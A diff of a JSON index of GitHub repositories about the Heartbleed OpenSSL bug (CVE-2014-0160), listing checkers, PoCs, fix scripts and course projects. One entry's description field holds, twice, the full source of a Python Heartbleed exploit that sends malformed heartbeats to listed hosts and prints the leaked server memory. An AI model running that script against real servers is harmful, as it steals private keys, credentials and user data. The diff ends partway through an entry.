@@ -895,23 +895,42 @@
           "clone_url": "https://github.com/belmind/heartbleed.git"
         },
         {
-          "id": 33456758,
-          "name": "heartbleed.py",
-          "full_name": "xanas/heartbleed.py",
-          "html_url": "https://github.com/xanas/heartbleed.py",
-          "description": "#!/usr/bin/python  # Modified by Travis Lee # -changed output to display text only instead of hexdump and made it easier to read # -added option to specify number of times to connect to server (to get more data) # -added option to specify TLS version # -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc...  # -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port) # -added option to have verbose output # -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command   # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org) # The author disclaims copyright to this source code.  import sys import struct import socket import time import select import re from optparse import OptionParser  options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)') options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)') options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)') options.add_option('-t', '--tls', type='int', default=1, help='Specify TLS version: 0 = 1.0, 1 = 1.1, 2 = 1.2 (default: 1)') options.add_option('-s', '--starttls', action=\"store_true\", dest=\"starttls\", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...') options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port') options.add_option('-v', '--verbose', action=\"store_true\", dest=\"verbose\", help='Enable verbose output')  opts, args = options.parse_args()  def h2bin(x):     return x.replace(' ', '').replace('\\n', '').decode('hex')  hello = h2bin(''' 16 03 02 00  dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00 00 0f 00 01 01                                   ''')  # set TLS version if opts.tls == 0:     hb = h2bin('''18 03 01 00 03 01 40 00''') elif opts.tls == 1:     hb = h2bin('''18 03 02 00 03 01 40 00''') elif opts.tls == 2:     hb = h2bin('''18 03 03 00 03 01 40 00''') else:     hb = h2bin('''18 03 02 00 03 01 40 00''')   def hexdump(s):     pdat = ''     for b in xrange(0, len(s), 16):         lin = [c for c in s[b : b + 16]]         #hxdat = ' '.join('%02X' % ord(c) for c in lin)         pdat += ''.join((c if ((32 \u003c= ord(c) \u003c= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin) \t#print '  %04x: %-48s %s' % (b, hxdat, pdat) \tpdat = re.sub(r'([.]{50,})', '', pdat)     return pdat  def recvall(s, length, timeout=5):     try:         endtime = time.time() + timeout         rdata = ''         remain = length         while remain \u003e 0:             rtime = endtime - time.time()              if rtime \u003c 0:                 return None             r, w, e = select.select([s], [], [], 5)             if s in r:                 data = s.recv(remain)                 # EOF?                 if not data:                     return None                 rdata += data                 remain -= len(data)         return rdata              except:        print \"Error receiving data: \", sys.exc_info()[0]  def recvmsg(s):     hdr = recvall(s, 5)     if hdr is None:         print 'Unexpected EOF receiving record header - server closed connection'         return None, None, None     typ, ver, ln = struct.unpack('\u003eBHH', hdr)     pay = recvall(s, ln, 10)     if pay is None:         print 'Unexpected EOF receiving record payload - server closed connection'         return None, None, None     if opts.verbose:         print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))     return typ, ver, pay  def hit_hb(s, targ):     s.send(hb)     while True:         typ, ver, pay = recvmsg(s)         if typ is None:             print 'No heartbeat response received, server likely not vulnerable'             return ''          if typ == 24:             if opts.verbose:                 print 'Received heartbeat response...'             #hexdump(pay)             if len(pay) \u003e 3:                 print 'WARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'             else:                 print 'Server processed malformed heartbeat, but did not return any extra data.'             return hexdump(pay)          if typ == 21:             print 'Received alert:'             hexdump(pay)             print 'Server returned error, likely not vulnerable'             return ''  def bleed(targ, port):     try:         res = ''         print         print '##################################################################'         print 'Connecting to: ' + targ + ':' + str(port) + ' with TLSv1.' + str(opts.tls)         for x in range(0, opts.num):             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             sys.stdout.flush()             s.settimeout(10)             s.connect((targ, port))              # send starttls command if specified as an option or if common smtp/pop3/imap ports are used             if (opts.starttls) or (port in {25, 587, 110, 143, 21}):                                  stls = False                 atls = False                                  # check if smtp supports starttls/stls                 if port in {25, 587}:                     print 'SMTP Port... Checking for STARTTLS Capability...'                     check = s.recv(1024)                     s.send(\"EHLO someone.org\\n\")                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                                              if \"STARTTLS\" in check:                         opts.starttls = True                         print \"STARTTLS command found\"                     elif \"STLS\" in check:                         opts.starttls = True                         stls = True                         print \"STLS command found\"                     else:                         print \"STARTTLS command NOT found!\"                         print '##################################################################'                         return                                  # check if pop3/imap supports starttls/stls                                             elif port in {110, 143}:                     print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'                     check = s.recv(1024)                     if port == 110:                         s.send(\"CAPA\\n\")                     if port == 143:                         s.send(\"CAPABILITY\\n\")                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                                                 if \"STARTTLS\" in check:                         opts.starttls = True                         print \"STARTTLS command found\"                     elif \"STLS\" in check:                         opts.starttls = True                         stls = True                         print \"STLS command found\"                     else:                         print \"STARTTLS command NOT found!\"                         print '##################################################################'                         return                                          # check if ftp supports auth tls/starttls                                           elif port in {21}:                     print 'FTP Port... Checking for AUTH TLS Capability...'                     check = s.recv(1024)                     s.send(\"FEAT\\n\")                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                              if \"STARTTLS\" in check:                         opts.starttls = True                         print \"STARTTLS command found\"                     elif \"AUTH TLS\" in check:                         opts.starttls = True                         atls = True                         print \"AUTH TLS command found\"                     else:                         print \"STARTTLS command NOT found!\"                         print '##################################################################'                         return                                                          # send appropriate tls command if supported                                         if opts.starttls:                            sys.stdout.flush()                     if stls:                         print 'Sending STLS Command...'                         s.send(\"STLS\\n\")                     elif atls:                         print 'Sending AUTH TLS Command...'                         s.send(\"AUTH TLS\\n\")                     else:                         print 'Sending STARTTLS Command...'                         s.send(\"STARTTLS\\n\")                     if opts.verbose:                         print 'Waiting for reply...'                     sys.stdout.flush()                     recvall(s, 100000, 1)              print             print 'Sending Client Hello...'             sys.stdout.flush()             s.send(hello)             if opts.verbose:                 print 'Waiting for Server Hello...'             sys.stdout.flush()             while True:                 typ, ver, pay = recvmsg(s)                 if typ == None:                     print 'Server closed connection without sending Server Hello.'                     print '##################################################################'                     return                 # Look for server hello done message.                 if typ == 22 and ord(pay[0]) == 0x0E:                     break              print 'Sending heartbeat request...'             sys.stdout.flush()             s.send(hb)             res += hit_hb(s, targ)             s.close()                  print '##################################################################'         print                return res          except:        print \"Error connecting to host: \", sys.exc_info()[0]        print '##################################################################'        print                 def main():     allresults = ''                          # if a file is specified, loop through file     if opts.filein:         fileIN = open(opts.filein, \"r\")                  for line in fileIN:             targetinfo = line.strip().split(\":\")             if len(targetinfo) \u003e 1:                 allresults = bleed(targetinfo[0], int(targetinfo[1]))             else:                 allresults = bleed(targetinfo[0], opts.port)                          if allresults:                 print '%s' % (allresults)          fileIN.close()      else:         if len(args) \u003c 1:             options.print_help()             return         allresults = bleed(args[0], opts.port)         if allresults:             print '%s' % (allresults)          print      if __name__ == '__main__':     main()",
+          "id": 1419072686,
+          "name": "Heartbleed-CSP-project",
+          "full_name": "0xTaoZ/Heartbleed-CSP-project",
+          "html_url": "https://github.com/0xTaoZ/Heartbleed-CSP-project",
+          "description": "Heartbleed (CVE-2014-0160) reproduction and analysis —CSP Application Security project",
           "stargazers_count": 1,
           "forks_count": 0,
-          "language": "",
-          "updated_at": "2026-02-28T16:41:58Z",
-          "pushed_at": "2015-04-05T22:03:31Z",
-          "created_at": "2015-04-05T22:03:30Z",
+          "language": "Python",
+          "updated_at": "2026-11-07T23:36:09Z",
+          "pushed_at": "2026-11-03T11:59:29Z",
+          "created_at": "2026-10-14T14:02:45Z",
           "topics": [],
           "owner": {
-            "login": "xanas",
-            "html_url": "https://github.com/xanas"
+            "login": "0xTaoZ",
+            "html_url": "https://github.com/0xTaoZ"
           },
-          "clone_url": "https://github.com/xanas/heartbleed.py.git"
+          "clone_url": "https://github.com/0xTaoZ/Heartbleed-CSP-project.git"
+        },
+        {
+          "id": 18737537,
+          "name": "heartbleed",
+          "full_name": "xlucas/heartbleed",
+          "html_url": "https://github.com/xlucas/heartbleed",
+          "description": "A research tool designed to check for OpenSSL CVE-2014-0160 vulnerability",
+          "stargazers_count": 1,
+          "forks_count": 0,
+          "language": "Ruby",
+          "updated_at": "2023-01-28T19:55:06Z",
+          "pushed_at": "2015-05-02T08:25:20Z",
+          "created_at": "2014-04-13T19:18:32Z",
+          "topics": [],
+          "owner": {
+            "login": "xlucas",
+            "html_url": "https://github.com/xlucas"
+          },
+          "clone_url": "https://github.com/xlucas/heartbleed.git"
         },
         {
           "id": 18613807,
@@ -931,6 +950,63 @@
             "html_url": "https://github.com/proactiveRISK"
           },
           "clone_url": "https://github.com/proactiveRISK/heartbleed-extention.git"
+        },
+        {
+          "id": 51847934,
+          "name": "CVE-2014-0160-Chrome-Plugin",
+          "full_name": "Xyl2k/CVE-2014-0160-Chrome-Plugin",
+          "html_url": "https://github.com/Xyl2k/CVE-2014-0160-Chrome-Plugin",
+          "description": "Heartbleed",
+          "stargazers_count": 1,
+          "forks_count": 1,
+          "language": "",
+          "updated_at": "2021-06-17T17:01:26Z",
+          "pushed_at": "2016-02-16T16:04:33Z",
+          "created_at": "2016-02-16T15:49:55Z",
+          "topics": [],
+          "owner": {
+            "login": "Xyl2k",
+            "html_url": "https://github.com/Xyl2k"
+          },
+          "clone_url": "https://github.com/Xyl2k/CVE-2014-0160-Chrome-Plugin.git"
+        },
+        {
+          "id": 33456758,
+          "name": "heartbleed.py",
+          "full_name": "xanas/heartbleed.py",
+          "html_url": "https://github.com/xanas/heartbleed.py",
+          "description": "#!/usr/bin/python  # Modified by Travis Lee # -changed output to display text only instead of hexdump and made it easier to read # -added option to specify number of times to connect to server (to get more data) # -added option to specify TLS version # -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc...  # -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port) # -added option to have verbose output # -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command   # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org) # The author disclaims copyright to this source code.  import sys import struct import socket import time import select import re from optparse import OptionParser  options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)') options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)') options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)') options.add_option('-t', '--tls', type='int', default=1, help='Specify TLS version: 0 = 1.0, 1 = 1.1, 2 = 1.2 (default: 1)') options.add_option('-s', '--starttls', action=\"store_true\", dest=\"starttls\", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...') options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port') options.add_option('-v', '--verbose', action=\"store_true\", dest=\"verbose\", help='Enable verbose output')  opts, args = options.parse_args()  def h2bin(x):     return x.replace(' ', '').replace('\\n', '').decode('hex')  hello = h2bin(''' 16 03 02 00  dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00 00 0f 00 01 01                                   ''')  # set TLS version if opts.tls == 0:     hb = h2bin('''18 03 01 00 03 01 40 00''') elif opts.tls == 1:     hb = h2bin('''18 03 02 00 03 01 40 00''') elif opts.tls == 2:     hb = h2bin('''18 03 03 00 03 01 40 00''') else:     hb = h2bin('''18 03 02 00 03 01 40 00''')   def hexdump(s):     pdat = ''     for b in xrange(0, len(s), 16):         lin = [c for c in s[b : b + 16]]         #hxdat = ' '.join('%02X' % ord(c) for c in lin)         pdat += ''.join((c if ((32 \u003c= ord(c) \u003c= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin) \t#print '  %04x: %-48s %s' % (b, hxdat, pdat) \tpdat = re.sub(r'([.]{50,})', '', pdat)     return pdat  def recvall(s, length, timeout=5):     try:         endtime = time.time() + timeout         rdata = ''         remain = length         while remain \u003e 0:             rtime = endtime - time.time()              if rtime \u003c 0:                 return None             r, w, e = select.select([s], [], [], 5)             if s in r:                 data = s.recv(remain)                 # EOF?                 if not data:                     return None                 rdata += data                 remain -= len(data)         return rdata              except:        print \"Error receiving data: \", sys.exc_info()[0]  def recvmsg(s):     hdr = recvall(s, 5)     if hdr is None:         print 'Unexpected EOF receiving record header - server closed connection'         return None, None, None     typ, ver, ln = struct.unpack('\u003eBHH', hdr)     pay = recvall(s, ln, 10)     if pay is None:         print 'Unexpected EOF receiving record payload - server closed connection'         return None, None, None     if opts.verbose:         print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))     return typ, ver, pay  def hit_hb(s, targ):     s.send(hb)     while True:         typ, ver, pay = recvmsg(s)         if typ is None:             print 'No heartbeat response received, server likely not vulnerable'             return ''          if typ == 24:             if opts.verbose:                 print 'Received heartbeat response...'             #hexdump(pay)             if len(pay) \u003e 3:                 print 'WARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'             else:                 print 'Server processed malformed heartbeat, but did not return any extra data.'             return hexdump(pay)          if typ == 21:             print 'Received alert:'             hexdump(pay)             print 'Server returned error, likely not vulnerable'             return ''  def bleed(targ, port):     try:         res = ''         print         print '##################################################################'         print 'Connecting to: ' + targ + ':' + str(port) + ' with TLSv1.' + str(opts.tls)         for x in range(0, opts.num):             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             sys.stdout.flush()             s.settimeout(10)             s.connect((targ, port))              # send starttls command if specified as an option or if common smtp/pop3/imap ports are used             if (opts.starttls) or (port in {25, 587, 110, 143, 21}):                                  stls = False                 atls = False                                  # check if smtp supports starttls/stls                 if port in {25, 587}:                     print 'SMTP Port... Checking for STARTTLS Capability...'                     check = s.recv(1024)                     s.send(\"EHLO someone.org\\n\")                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                                              if \"STARTTLS\" in check:                         opts.starttls = True                         print \"STARTTLS command found\"                     elif \"STLS\" in check:                         opts.starttls = True                         stls = True                         print \"STLS command found\"                     else:                         print \"STARTTLS command NOT found!\"                         print '##################################################################'                         return                                  # check if pop3/imap supports starttls/stls                                             elif port in {110, 143}:                     print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'                     check = s.recv(1024)                     if port == 110:                         s.send(\"CAPA\\n\")                     if port == 143:                         s.send(\"CAPABILITY\\n\")                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                                                 if \"STARTTLS\" in check:                         opts.starttls = True                         print \"STARTTLS command found\"                     elif \"STLS\" in check:                         opts.starttls = True                         stls = True                         print \"STLS command found\"                     else:                         print \"STARTTLS command NOT found!\"                         print '##################################################################'                         return                                          # check if ftp supports auth tls/starttls                                           elif port in {21}:                     print 'FTP Port... Checking for AUTH TLS Capability...'                     check = s.recv(1024)                     s.send(\"FEAT\\n\")                     sys.stdout.flush()                     check += s.recv(1024)                     if opts.verbose:                         print check                                              if \"STARTTLS\" in check:                         opts.starttls = True                         print \"STARTTLS command found\"                     elif \"AUTH TLS\" in check:                         opts.starttls = True                         atls = True                         print \"AUTH TLS command found\"                     else:                         print \"STARTTLS command NOT found!\"                         print '##################################################################'                         return                                                          # send appropriate tls command if supported                                         if opts.starttls:                            sys.stdout.flush()                     if stls:                         print 'Sending STLS Command...'                         s.send(\"STLS\\n\")                     elif atls:                         print 'Sending AUTH TLS Command...'                         s.send(\"AUTH TLS\\n\")                     else:                         print 'Sending STARTTLS Command...'                         s.send(\"STARTTLS\\n\")                     if opts.verbose:                         print 'Waiting for reply...'                     sys.stdout.flush()                     recvall(s, 100000, 1)              print             print 'Sending Client Hello...'             sys.stdout.flush()             s.send(hello)             if opts.verbose:                 print 'Waiting for Server Hello...'             sys.stdout.flush()             while True:                 typ, ver, pay = recvmsg(s)                 if typ == None:                     print 'Server closed connection without sending Server Hello.'                     print '##################################################################'                     return                 # Look for server hello done message.                 if typ == 22 and ord(pay[0]) == 0x0E:                     break              print 'Sending heartbeat request...'             sys.stdout.flush()             s.send(hb)             res += hit_hb(s, targ)             s.close()                  print '##################################################################'         print                return res          except:        print \"Error connecting to host: \", sys.exc_info()[0]        print '##################################################################'        print                 def main():     allresults = ''                          # if a file is specified, loop through file     if opts.filein:         fileIN = open(opts.filein, \"r\")                  for line in fileIN:             targetinfo = line.strip().split(\":\")             if len(targetinfo) \u003e 1:                 allresults = bleed(targetinfo[0], int(targetinfo[1]))             else:                 allresults = bleed(targetinfo[0], opts.port)                          if allresults:                 print '%s' % (allresults)          fileIN.close()      else:         if len(args) \u003c 1:             options.print_help()             return         allresults = bleed(args[0], opts.port)         if allresults:             print '%s' % (allresults)          print      if __name__ == '__main__':     main()",
+          "stargazers_count": 1,
+          "forks_count": 0,
+          "language": "",
+          "updated_at": "2026-02-28T16:41:58Z",
+          "pushed_at": "2015-04-05T22:03:31Z",
+          "created_at": "2015-04-05T22:03:30Z",
+          "topics": [],
+          "owner": {
+            "login": "xanas",
+            "html_url": "https://github.com/xanas"
+          },
+          "clone_url": "https://github.com/xanas/heartbleed.py.git"
+        },
+        {
+          "id": 18649488,
+          "name": "openssl-heartbleed-fix",
+          "full_name": "sammyfung/openssl-heartbleed-fix",
+          "html_url": "https://github.com/sammyfung/openssl-heartbleed-fix",
+          "description": "OpenSSL Heartbleed (CVE-2014-0160) Fix script",
+          "stargazers_count": 1,
+          "forks_count": 0,
+          "language": "Shell",
+          "updated_at": "2014-06-11T14:34:33Z",
+          "pushed_at": "2014-04-10T20:11:58Z",
+          "created_at": "2014-04-10T19:47:42Z",
+          "topics": [],
+          "owner": {
+            "login": "sammyfung",
+            "html_url": "https://github.com/sammyfung"
+          },
+          "clone_url": "https://github.com/sammyfung/openssl-heartbleed-fix.git"
         },
         {
           "id": 161246011,
@@ -971,82 +1047,6 @@
           "clone_url": "https://github.com/vortextube/ssl_scanner.git"
         },
         {
-          "id": 18649488,
-          "name": "openssl-heartbleed-fix",
-          "full_name": "sammyfung/openssl-heartbleed-fix",
-          "html_url": "https://github.com/sammyfung/openssl-heartbleed-fix",
-          "description": "OpenSSL Heartbleed (CVE-2014-0160) Fix script",
-          "stargazers_count": 1,
-          "forks_count": 0,
-          "language": "Shell",
-          "updated_at": "2014-06-11T14:34:33Z",
-          "pushed_at": "2014-04-10T20:11:58Z",
-          "created_at": "2014-04-10T19:47:42Z",
-          "topics": [],
-          "owner": {
-            "login": "sammyfung",
-            "html_url": "https://github.com/sammyfung"
-          },
-          "clone_url": "https://github.com/sammyfung/openssl-heartbleed-fix.git"
-        },
-        {
-          "id": 51847934,
-          "name": "CVE-2014-0160-Chrome-Plugin",
-          "full_name": "Xyl2k/CVE-2014-0160-Chrome-Plugin",
-          "html_url": "https://github.com/Xyl2k/CVE-2014-0160-Chrome-Plugin",
-          "description": "Heartbleed",
-          "stargazers_count": 1,
-          "forks_count": 1,
-          "language": "",
-          "updated_at": "2021-06-17T17:01:26Z",
-          "pushed_at": "2016-02-16T16:04:33Z",
-          "created_at": "2016-02-16T15:49:55Z",
-          "topics": [],
-          "owner": {
-            "login": "Xyl2k",
-            "html_url": "https://github.com/Xyl2k"
-          },
-          "clone_url": "https://github.com/Xyl2k/CVE-2014-0160-Chrome-Plugin.git"
-        },
-        {
-          "id": 18737537,
-          "name": "heartbleed",
-          "full_name": "xlucas/heartbleed",
-          "html_url": "https://github.com/xlucas/heartbleed",
-          "description": "A research tool designed to check for OpenSSL CVE-2014-0160 vulnerability",
-          "stargazers_count": 1,
-          "forks_count": 0,
-          "language": "Ruby",
-          "updated_at": "2023-01-28T19:55:06Z",
-          "pushed_at": "2015-05-02T08:25:20Z",
-          "created_at": "2014-04-13T19:18:32Z",
-          "topics": [],
-          "owner": {
-            "login": "xlucas",
-            "html_url": "https://github.com/xlucas"
-          },
-          "clone_url": "https://github.com/xlucas/heartbleed.git"
-        },
-        {
-          "id": 1144068747,
-          "name": "CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160",
-          "full_name": "SimoesCTT/CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160",
-          "html_url": "https://github.com/SimoesCTT/CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160",
-          "description": "Heartbleed (CVE-2014-0160) was devastating because it leaked adjacent memory. CTT-Heartbleed goes further—it uses 33-layer temporal resonance to map, reconstruct, and extract specific memory regions across time, not just adjacent buffers.",
-          "stargazers_count": 0,
-          "forks_count": 0,
-          "language": "Python",
-          "updated_at": "2026-01-28T08:56:24Z",
-          "pushed_at": "2026-01-28T08:56:20Z",
-          "created_at": "2026-01-28T08:54:28Z",
-          "topics": [],
-          "owner": {
-            "login": "SimoesCTT",
-            "html_url": "https://github.com/SimoesCTT"
-          },
-          "clone_url": "https://github.com/SimoesCTT/CTT-HEARTBLEED-Temporal-Resonance-Memory-Leak-Exploit-Heartbleed-CVE-2014-0160.git"
-        },
-        {
           "id": 156641077,
           "name": "OpenSSL-HeartBleed-CVE-2014-0160-PoC",
           "full_name": "caiqiqi/OpenSSL-HeartBleed-CVE-2014-0160-PoC",
@@ -1085,42 +1085,23 @@
           "clone_url": "https://github.com/ThanHuuTuan/Heartexploit.git"
         },
         {
-          "id": 965182775,
-          "name": "HeartbleedAttack",
-          "full_name": "Shayhha/HeartbleedAttack",
-          "html_url": "https://github.com/Shayhha/HeartbleedAttack",
-          "description": "This is the Heratbleed bug (CVE-2014-0160) documentation I did for Advenced Cyber Attacks course.",
-          "stargazers_count": 0,
-          "forks_count": 0,
-          "language": "Java",
-          "updated_at": "2025-06-19T18:40:22Z",
-          "pushed_at": "2025-12-03T10:59:09Z",
-          "created_at": "2025-04-12T15:42:22Z",
-          "topics": [],
-          "owner": {
-            "login": "Shayhha",
-            "html_url": "https://github.com/Shayhha"
-          },
-          "clone_url": "https://github.com/Shayhha/HeartbleedAttack.git"
-        },
-        {
-          "id": 1448267742,
-          "name": "cortex9-heartbleed-heartbeat-bounds-model",
-          "full_name": "federiconbaez/cortex9-heartbleed-heartbeat-bounds-model",
-          "html_url": "https://github.com/federiconbaez/cortex9-heartbleed-heartbeat-bounds-model",
-          "description": "Offline model of the OpenSSL heartbeat bounds check (CVE-2014-0160) over an in-memory record and a labelled simulated region. No TLS, no real memory.",
+          "id": 1409876662,
+          "name": "vulhub-openssl-cve-2014-0160",
+          "full_name": "CyberCTF/vulhub-openssl-cve-2014-0160",
+          "html_url": "https://github.com/CyberCTF/vulhub-openssl-cve-2014-0160",
+          "description": "Vulhub openssl/CVE-2014-0160: Heartbleed on nginx with OpenSSL 1.0.1c, run with Isoloom",
           "stargazers_count": 0,
           "forks_count": 0,
           "language": "Python",
-          "updated_at": "2026-11-06T13:01:38Z",
-          "pushed_at": "2026-11-06T13:01:33Z",
-          "created_at": "2026-11-06T13:01:27Z",
+          "updated_at": "2026-11-05T15:29:04Z",
+          "pushed_at": "2026-11-05T15:28:58Z",
+          "created_at": "2026-10-08T06:53:52Z",
           "topics": [],
           "owner": {
-            "login": "federiconbaez",
-            "html_url": "https://github.com/federiconbaez"
+            "login": "CyberCTF",
+            "html_url": "https://github.com/CyberCTF"
           },
-          "clone_url": "https://github.com/federiconbaez/cortex9-heartbleed-heartbeat-bounds-model.git"
+          "clone_url": "https://github.com/CyberCTF/vulhub-openssl-cve-2014-0160.git"
         },
         {
           "id": 1009877495,
@@ -1180,6 +1161,25 @@
           "clone_url": "https://github.com/cbk914/heartbleed-checker.git"
         },
         {
+          "id": 672705203,
+          "name": "cve-2014-0160-heartbleed",
+          "full_name": "timsonner/cve-2014-0160-heartbleed",
+          "html_url": "https://github.com/timsonner/cve-2014-0160-heartbleed",
+          "description": "",
+          "stargazers_count": 0,
+          "forks_count": 1,
+          "language": "Python",
+          "updated_at": "2023-07-31T01:13:29Z",
+          "pushed_at": "2023-07-31T01:13:26Z",
+          "created_at": "2023-07-31T01:12:02Z",
+          "topics": [],
+          "owner": {
+            "login": "timsonner",
+            "html_url": "https://github.com/timsonner"
+          },
+          "clone_url": "https://github.com/timsonner/cve-2014-0160-heartbleed.git"
+        },
+        {
           "id": 37109043,
           "name": "cve-2014-0160-Yunfeng-Jiang",
           "full_name": "marstornado/cve-2014-0160-Yunfeng-Jiang",
@@ -1218,25 +1218,6 @@
           "clone_url": "https://github.com/iSCInc/heartbleed.git"
         },
         {
-          "id": 672705203,
-          "name": "cve-2014-0160-heartbleed",
-          "full_name": "timsonner/cve-2014-0160-heartbleed",
-          "html_url": "https://github.com/timsonner/cve-2014-0160-heartbleed",
-          "description": "",
-          "stargazers_count": 0,
-          "forks_count": 1,
-          "language": "Python",
-          "updated_at": "2023-07-31T01:13:29Z",
-          "pushed_at": "2023-07-31T01:13:26Z",
-          "created_at": "2023-07-31T01:12:02Z",
-          "topics": [],
-          "owner": {
-            "login": "timsonner",
-            "html_url": "https://github.com/timsonner"
-          },
-          "clone_url": "https://github.com/timsonner/cve-2014-0160-heartbleed.git"
-        },
-        {
           "id": 634550740,
           "name": "CVE-2014-0160-Chrome-Plugin",
           "full_name": "MrE-Fog/CVE-2014-0160-Chrome-Plugin",
@@ -1256,42 +1237,42 @@
           "clone_url": "https://github.com/MrE-Fog/CVE-2014-0160-Chrome-Plugin.git"
         },
         {
-          "id": 1409876662,
-          "name": "vulhub-openssl-cve-2014-0160",
-          "full_name": "CyberCTF/vulhub-openssl-cve-2014-0160",
-          "html_url": "https://github.com/CyberCTF/vulhub-openssl-cve-2014-0160",
-          "description": "Vulhub openssl/CVE-2014-0160: Heartbleed on nginx with OpenSSL 1.0.1c, run with Isoloom",
+          "id": 1448267742,
+          "name": "cortex9-heartbleed-heartbeat-bounds-model",
+          "full_name": "federiconbaez/cortex9-heartbleed-heartbeat-bounds-model",
+          "html_url": "https://github.com/federiconbaez/cortex9-heartbleed-heartbeat-bounds-model",
+          "description": "Offline model of the OpenSSL heartbeat bounds check (CVE-2014-0160) over an in-memory record and a labelled simulated region. No TLS, no real memory.",
           "stargazers_count": 0,
           "forks_count": 0,
           "language": "Python",
-          "updated_at": "2026-11-05T15:29:04Z",
-          "pushed_at": "2026-11-05T15:28:58Z",
-          "created_at": "2026-10-08T06:53:52Z",
+          "updated_at": "2026-11-06T13:01:38Z",
+          "pushed_at": "2026-11-06T13:01:33Z",
+          "created_at": "2026-11-06T13:01:27Z",
           "topics": [],
           "owner": {
-            "login": "CyberCTF",
-            "html_url": "https://github.com/CyberCTF"
+            "login": "federiconbaez",
+            "html_url": "https://github.com/federiconbaez"
           },
-          "clone_url": "https://github.com/CyberCTF/vulhub-openssl-cve-2014-0160.git"
+          "clone_url": "https://github.com/federiconbaez/cortex9-heartbleed-heartbeat-bounds-model.git"
         },
         {
-          "id": 1419072686,
-          "name": "Heartbleed-CSP-project",
-          "full_name": "0xTaoZ/Heartbleed-CSP-project",
-          "html_url": "https://github.com/0xTaoZ/Heartbleed-CSP-project",
-          "description": "Heartbleed (CVE-2014-0160) reproduction and analysis —CSP Application Security project",
+          "id": 1442422345,
+          "name": "security-digest-modern-classics",
+          "full_name": "mcpmark-eval-liuhezi/security-digest-modern-classics",
+          "html_url": "https://github.com/mcpmark-eval-liuhezi/security-digest-modern-classics",
+          "description": "Modern Classics — Quarterly Security Digest: Log4Shell, Heartbleed, Shellshock, xz backdoor (CVE-2021-44228, CVE-2014-0160, CVE-2014-6271, CVE-2024-3094) with GHSA ids, CVSS, first fixed versions, links and logo images",
           "stargazers_count": 0,
           "forks_count": 0,
-          "language": "Python",
